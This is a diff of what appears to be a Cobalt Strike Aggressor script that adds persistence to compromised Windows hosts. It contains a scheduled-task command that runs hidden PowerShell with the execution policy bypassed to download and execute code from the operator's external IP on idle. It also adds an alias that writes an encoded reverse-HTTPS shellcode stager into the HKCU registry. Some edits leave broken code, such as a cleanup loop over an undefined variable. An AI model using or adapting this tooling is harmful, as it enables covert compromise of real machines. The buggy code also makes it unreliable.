@@ -41,9 +41,8 @@ sub randomString {
 
 alias addschtaskOnidle {
 
-	@tasknames = pref_get_list("tasknames.list");
-
-	$task = @tasknames[rand(size(@tasknames))];
+	@tasknamelist = pref_get_list("taskname.list");
+	$taskname = @tasknamelist[rand(size(@tasknamelist))];
 
 	%site = getSiteURL();
 
@@ -51,7 +50,7 @@ alias addschtaskOnidle {
 	$port = %site['Port'];
 	$uri = %site['URI'];
 
-	$schtask = "schtasks /create /tn $task /tr \"c:\\windows\\SYSWOW64\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://" . $extip . ": $+ $port $+ $uri $+ '''))'\" /sc onidle /i 30 /f";
+	$schtask = "schtasks /create /tn $taskname /tr \"c:\\windows\\SYSWOW64\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://" . $extip . ": $+ $port $+ $uri $+ '''))'\" /sc onidle /i 30 /f";
 	bshell($1,$schtask);
 	blog($1,"Schtask Onidle dropped..");
 }
@@ -59,22 +58,42 @@ alias addschtaskOnidle {
 alias schtasksclean {
 	@tasknames = pref_get_list("tasknames.list");
 
-	foreach $task (@tasknames) {
+	foreach $taskname (@tasknamelist) {
 		bshell($1,"schtasks /delete /tn $task /f");
 	}
+}
 
+alias addRegdebug {
+
+	local('$Hive $payload $regpath $Name');
+
+	$shellcode  = shellcode("revhttps", false);
+        $PAYLOAD = powershell_encode_stager($shellcode);
+
+	$HIVE = "HKCU";
+	$REGPATH = "\\Software\\Microsoft\\Windows\\";
+        $NAME = "debug";
+
+        # add the key
+        addRegKey($1,$HIVE,$REGPATH,$NAME,$PAYLOAD);
 
 }
+
+
+
+
+
 
 sub isAdmin {
     return iff( right(beacon_info($1, "user"), 2) eq " *" , true, false);
 }
 
 sub addRegKey {
-	$hive,$keyPath,$keyName,$regPayload = @_ ;
-	$powershell = "New-ItemProperty -Force -Path \" $+ $hive $+ : $+ $keyPath $+ \" -Name \" $+ $keyName $+ \" -PropertyType String -Value \" $+ $regPayload $+ \"";
-	blog($powershell);
-	bpowershell($1, $powershell);
+	local('$beacon $hive $keyPath $keyName $regPayload');
+	println ("$beacon $hive $keyPath $keyName $regPayload");
+	#$powershell = "New-ItemProperty -Force -Path \" $+ $2 $+ : $+ $3 $+ \" -Name \" $+ $4 $+ \" -Value \" $+ $5 $+ \"";
+	$powershell = "New-ItemProperty -Force -Path \" $+ $2 $+ : $+ $3 $+ \" -Name \" $+ $4 $+ \" -PropertyType String -Value \" $+ $5 $+ \"";
+	bpowershell($1,$powershell);
 }
 
 sub remRegKey {
